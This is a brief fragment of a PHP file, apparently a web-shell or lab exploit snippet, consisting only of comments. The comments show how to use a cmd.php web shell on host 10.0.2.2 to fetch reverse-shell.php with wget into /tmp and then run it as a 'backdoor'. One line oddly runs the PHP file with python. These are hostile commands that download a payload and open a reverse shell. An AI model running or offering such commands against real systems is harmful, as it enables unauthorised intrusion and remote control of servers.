<?php
    ...
    // http://10.0.2.2/images/cmd.php?cmd=wget%20http://10.0.2.2/scripts/reverse-shell.php -O /tmp/reverse-shell.php
    // 
    // Run new PHP backdoor script
    // http://10.0.2.2/images/cmd.php?cmd=python /tmp/reverse-shell.php
    // 
